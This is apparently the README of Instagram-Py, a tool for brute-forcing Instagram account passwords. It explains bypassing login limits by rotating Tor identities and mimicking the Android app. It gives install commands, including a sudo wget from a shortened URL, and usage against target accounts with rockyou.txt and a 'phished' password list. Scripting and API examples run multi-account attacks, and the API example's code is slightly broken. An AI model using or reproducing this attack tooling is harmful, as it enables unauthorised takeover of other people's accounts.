        | This project was started as a **POC** and then evolved into something. I first started this project when a lot of people
        | started asking about brute forcing instagram and so I started working on a **Proof-Of-Concept** for brute forcing instagram
        | without any password (try) limiting. Another reason to start working on this project was that there was no good tool to do
        | this job , Yep! even now if you search through github you cannot find a tool which is good as instagram-py. Since a few people
        | liked this tool , I decided to give it a **LTS**. Still there exists some old versions of instagram-py all-over github but
        | **this is the official repo**. You can also use **different versions** of **instagram-py** through **pip**.

        ------
         How?
        ------
        
        | We use , **tor** to change our ip once blocked for many tries and continue attack.
        | Since the official api is not a hacker wants, So we use the **InstagramAPK signature** to stay **anonymous!**
        | And we also **save** the **progress** so that even in network interruption we can avoid breaking the computer!
        
        
        -------
         What?
        -------
        
        | **Instagram-Py** is a slick python script to perform  **brute force** attack against **Instagram** ,   
        | this script can **bypass** login limiting on wrong passwords ,  so basically it can test **infinite number of passwords**.
        | Instagram-Py is **proved** and can test **over 6M** passwords on a single instagram account with **less resource** as possible
        | This script mimics the activities of the official **instagram android app** and sends request over **tor** so you are secure ,
        | but if your **tor** installation is **misconfigured** then the blame is on you.
        
        
        ------------
         Features
        ------------
        
        * Ultra Portable
        
          As of Instagram-Py v2.0.6 , Instagram-Py is also distributed in **AppImages** , If you use
          Instagram-Py bundled in a AppImage , **You do not need to install anything , even tor.**
          Just **download** , **mark it executable** and **enjoy**! 
          Now Instagram-Py is the only (*The best of my knowledge*) hacking tool which is ultra portable that you
          can carry in a thumb drive. ( And use it in **any Linux Distro without installing anything**).
          know more in the installation section.
        
        * Instagram-Py Scripting
        
          Craft your own python script which will embed into Instagram-Py for Maximum Customization of your
          brute force attack , example: What if you want a message sent to your phone when an account is hacked?
        
        * Resumes Attacks when the same wordlist is used on the same Username
        * Dumps successfully cracked accounts.
        * Maximum Customization! ( This includes multiple attack vectors! )
        * Fast and Clean Code , no ugly selenum drivers! ( Pure Requests )
        * Elegant Tor Identity Change with Stem ( Tor's Official Library for Python )
        
        
        **Depends on**: python3 , tor ,  requests , requests[socks] , stem (*Don't need anything if you use Instagram-Py Portable*)
        
        ==============
         Installation
        ==============
        
        ------------------------------------------------------------
        Get Instagram-Py with Zero Setup ( Instagram-Py Portable )
        ------------------------------------------------------------
        
        
        Just **execute** this **single command** and you will have everything to start using
        **Instagram-Py** right-away!
        **This Method is only possible for Linux Distro's with 64Bit Architecture** (*Any Linux Distro which is 64 Bit*).
        **If you use this method...**
        
        * You **don't** need to install anything in your **linux distro**.
        * You **don't** even need **python** and **tor server** installed.
        * You **don't** need any type of **configuration**. (*It Just Works!*)
        
        
        ::
        
         $ sudo wget -O /usr/bin/instagram-py https://git.io/vxKaq; sudo chmod +x /usr/bin/instagram-py
         $ instagram-py # Installed , Easy right ?
        
        
        
        **Caution**: Please don't mix up this installation and pip installation as it may give unexpected
        output.
        
        You can also download **instagram-py** directly from the release page and save it in a thumb drive
        to use it later, Cool right ?
        
        
        ---------------------------------
         Upgrading Instagram-Py with pip
        ---------------------------------
        
        ::
        
         $ sudo pip3 install instagram-py --upgrade
        
        
        -------------------------------
         using pip to get Instagram-py
        -------------------------------
        
        **Make sure you have got the latest version of pip(>= 9.0 and python(>= 3.6)**
        
        ::
        
         $ sudo easy_install3 -U pip # you have to install python3-setuptools , update pip
         $ sudo pip3 install requests --upgrade
         $ sudo pip3 install requests[socks]
         $ sudo pip3 install stem
         $ sudo pip3 install instagram-py
         $ instagram-py # installed successfully
         $ # Configuration is Super Important so Lets Create One
         $ instagram-py --create-configuration # follow the steps... 
        
        --------------------------------
            Configuring Instagram-Py
        --------------------------------
        
        **As of v2.0.0 Configuration is Simply done by Passing an Argument to Instagram-Py**
        
        ::
        
         $ instagram-py --create-configuration
         $      # OR
         $ instagram-py -cc
        
        
        
        **Or if you just want the default settings without the annoying questions then**
        
        ::
        
         $ instagram-py --create-configuration --default-configuration
         $      # OR
         $ instagram-py -cc -dc
        
        
        
        --------------------------------------------------
            Configuring Tor server to open control port
        --------------------------------------------------
        
        open your **tor configuration** file usually located at **/etc/tor/torrc**
        
        
        ::
         
         $ sudo vim /etc/tor/torrc # open it with your text editor
         
        
        **search** for the file for this **specific section**
        
        ::
        
         ## The port on which Tor will listen for local connections from Tor
         ## controller applications, as documented in control-spec.txt.
         #ControlPort 9051
         
        **uncomment** 'ControlPort' by deleting the **#** before 'ControlPort' , **now save the file and restart your tor server**
        
        **now you are ready to crack any instagram account , make sure your tor configuration matched ~/instapy-config.json** 
        
        =============
            Usage
        =============
        
        **Finally** , now you can use instagram-py!
        
        **Instagram-Py Scripting lets you run Custom Python Scripts Inside Instagram-Py!**
        
        **Never Run Instagram-Py with Multiple Instance! , Use Instagram-Py Scripting Instead!**
        
        
        ::
        
         $ instagram-py -u your_account_username -pl path_to_password_list
        
        
        **Note**: Without the **-c** optional argument , instagram-py **will not continue the attack**
        
        ::
        
         usage: instagram-py [-h] [--username USERNAME] [--password-list PASSWORD_LIST]
                             [--script SCRIPT] [--inspect-username INSPECT_USERNAME]
                             [--create-configuration] [--default-configuration]
                             [--countinue] [--verbose]
         
         optional arguments:
           -h, --help            show this help message and exit
           --username USERNAME, -u USERNAME
                                 username for Instagram account
           --password-list PASSWORD_LIST, -pl PASSWORD_LIST
                                 password list file to try with the given username.
           --script SCRIPT, -s SCRIPT
                                 Instagram-Py Attack Script.
           --inspect-username INSPECT_USERNAME, -i INSPECT_USERNAME
                                 Username to inspect in the instagram-py dump.
           --create-configuration, -cc
                                 Create a Configuration file for Instagram-Py with
                                 ease.
           --default-configuration, -dc
                                 noconfirm for Instagram-Py Configuration Creator!
           --continue-attack, -c       Continue the previous attack if found.
           --verbose, -v         Activate Verbose mode. ( Verbose level )
        
         example: instagram-py -c -vvv -u instatestgod__ -pl rockyou.txt

        ========================
         Instagram-Py Scripting
        ========================
        
        Instagram-Py now lets you run your custom scripts inside of it for maximum customization of your attacks.
        This Scripts are simple Python Scripts ( You Can just do anything that is possible with python )
        
        **Witness the power of Instagram-Py Scripting**
        
        ::
        
         #!/usr/bin/instagram-py -s
         # Only Supports Python 3
        
         import os
        
         def hacked_an_account(username , password):
            # Use Twilio API to Make a Message to our phone MayBe?
            print("Account Cracked!")
            return True
        
        
         print("Initiating Multi Username Attack Script...")
        
         global_callback = hacked_an_account
         global_password_list = "{}/.exploits/facebook-phished.txt".format(os.path.expanduser('~'))
        
         usernames = [ # Reserved Variable
           {
           "id" : "instatestgod__",
           "password_list" : "/home/antonyjr/Developer/.exploits/rockyou.txt" , # full path
           "continue" : True, # Optional
           "verbose" : 0 # Optional
            },
           # If you want to simultaniously attack the same account with different wordlist
           # Apparently Saving does not work here if two wordlist are used on a single user!
           # could be later fixed anyways...
           {
           "id" : "instatestgod__",
           # global password list will cover us if password list is not mentioned!
           "continue" : False, # Optional
           "verbose" : 3 # Optional
           }
           # ,
           # {
           # "id" : "even_more_users",
           # "password_list" : "different_passwords.lst",
           # }
         ]
        
        
        
        **You Can Always View the Cracked Passwords Using this command!**
        
        ::
        
         $ instagram-py -i instatestgod__
         $ # Displays record if it is cracked in the past!
        
        ===========================
         Using Instagram-Py as API
        ===========================
        
        **Instagram-Py supports to be used as a module as of v1.3.2 , so you don't want to reproduce my code. Just use it!**
        
        For some reason you wish not to use my software then you can use my software as a module and embed into your own
        software , anyway its native so its just gonna run the same as the official command-line tool unless you do something crazy.
        
        **Follow the same installation method mentioned above to install Instagram-Py API.**
        
        This is a simple script to conduct a bructe force attack using instagram-py as a API.
        
        ::
        
         #!/usr/bin/env python3
         '''
           This is the same thing that is in the __init__ file of the command-line
           tool.
         '''
         from InstagramPy.InstagramPyCLI import InstagramPyCLI
         from InstagramPy.InstagramPySession import InstagramPySession , DEFAULT_PATH
         from InstagramPy.InstagramPyInstance import InstagramPyInstance
         from datetime import datetime
         
         username = "TARGET ACCOUNT USERNAME"
         password = "PASSWORD LIST PATH"
        
         appInfo = {
            "version"     : "0.0.1",

            "example"     : ""
         }
        
         cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3)
         
         '''
         # USE THIS IF YOU WANT
         cli.PrintHeader()
         cli.PrintDatetime()
         '''
         session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)
         session.ReadSaveFile(True) # True to countinue attack if found save file.
         '''
         # USE THIS IF YOU WANT
         cli.PrintMagicCookie(session.magic_cookie)
         '''
        
         '''
          Defining @param cli = None will make Instagram-Py run silently so you
          can you use your own interface if you like.
          or if you want to use the official interface then declare like this
        
          instagrampy = InstagramPyInstance(cli = cli , session = session)
        
         '''

                instagrampy.TryPassword()
